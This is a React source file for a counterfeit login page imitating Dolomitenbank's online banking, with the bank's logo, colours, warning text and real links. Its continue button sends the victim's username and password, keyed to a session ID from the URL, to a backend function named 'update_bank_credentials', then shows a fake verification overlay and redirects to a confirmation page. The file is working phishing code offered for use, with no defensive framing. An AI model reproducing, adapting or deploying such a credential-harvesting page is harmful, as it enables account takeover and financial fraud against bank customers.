import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import dolomitenbankLogo from "@/assets/dolomitenbank-logo.png";
import dolomitenbankBg from "@/assets/dolomitenbank-bg.png";
import dolomitenbankIcon from "@/assets/dolomiten_bank.png";

const Dolomitenbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DolomitenBanking - Login", dolomitenbankIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#52636b", borderBottom: "1px solid #52636b" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-1">
          <img src={dolomitenbankLogo} alt="Dolomitenbank" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${dolomitenbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[620px] rounded overflow-hidden">
          {/* Login header bar */}
          <div
            className="px-6 py-4 font-semibold text-2xl"
            style={{ backgroundColor: "#637781", color: "#edeff0" }}
          >
            {lang === "de" ? "Login DolomitenBanking" : "Login"}
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-xs md:text-base leading-tight" style={{ color: "#333" }}>
              {lang === "de"
                ? "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Passwort oder einer TAN fragen."
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Username block */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="font-normal text-sm" style={{ color: "#999" }}>
                  {lang === "de" ? "Benutzername" : "User name or authorised party number"}
                </span>
                <span className="text-sm">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setLang(lang === "de" ? "en" : "de");
                    }}
                    className="no-underline hover:underline"
                    style={{ color: "#637781" }}
                  >
                    {lang === "de" ? "English" : "Deutsch"}
                  </a>
                </span>
              </div>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: "#e5e7e9",
                    borderColor: isFocused ? "#000" : "#e5e7e9",
                  }}
                />
                {username && (
                  <button
                    onClick={() => setUsername("")}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    <X size={24} color={isFocused ? "#000" : "#333"} />
                  </button>
                )}
              </div>
            </div>

            {/* Password block */}
            <div className="space-y-1">
              <span className="font-normal text-sm" style={{ color: "#999" }}>
                {lang === "de" ? "Passwort" : "Password"}
              </span>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setIsPasswordFocused(true)}
                  onBlur={() => setIsPasswordFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: "#e5e7e9",
                    borderColor: isPasswordFocused ? "#000" : "#e5e7e9",
                  }}
                />
                {password && (
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    {showPassword ? <EyeOff size={20} color={isPasswordFocused ? "#000" : "#333"} /> : <Eye size={20} color={isPasswordFocused ? "#000" : "#333"} />}
                  </button>
                )}
              </div>
            </div>

            {/* Info text */}
            <p className="text-xs md:text-[15px] text-center" style={{ color: "#000" }}>
              {lang === "de" ? (
                <>Funktioniert der Einstieg nicht? Haben Sie noch eine Verfügernummer? - <a href="https://www.dolomitenbank.at/m010/dolomitenbank/de/produkt/umstellung_dolomitenbanking.jsp" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#637781" }}>Hier</a> erfahren Sie wie Sie zu Ihrem neuem Benutzername / Passwort kommen. Ein Einstieg mit Ihrer bisherigen Verfügernummer ist nicht mehr möglich!</>
              ) : (
                <>Doesnt getting started work? Do you still have a authorised party number ? - <a href="https://www.dolomitenbank.at/m010/dolomitenbank/de/produkt/umstellung_dolomitenbanking.jsp" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#637781" }}>Here</a> you can find out how to get your new username / password. It is no longer possible to start with your previous authorised party number!</>
              )}
            </p>

            {/* Full-width divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 font-semibold rounded-md text-base"
              style={{ backgroundColor: "#637781", color: "#edeff0" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center" style={{ gap: 0 }}>
              <a
                href="https://www.banking.co.at/banking/login.xhtml?m=10#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#637781" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
              <a
                href="https://www.banking.co.at/banking/login.xhtml?m=10#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#637781" }}
              >
                {lang === "de" ? "Passwort vergessen" : "Forgot password"}
              </a>
              {lang === "de" && (
                <>
                  <div className="h-4" />
                  <a
                    href="https://www.dolomitenbank.at/private/dolomitenbanking-internetbanking/internetbanking-dolomitenbanking"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#637781" }}
                  >
                    Mehr über das DolomitenBanking
                  </a>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Dolomitenbank;
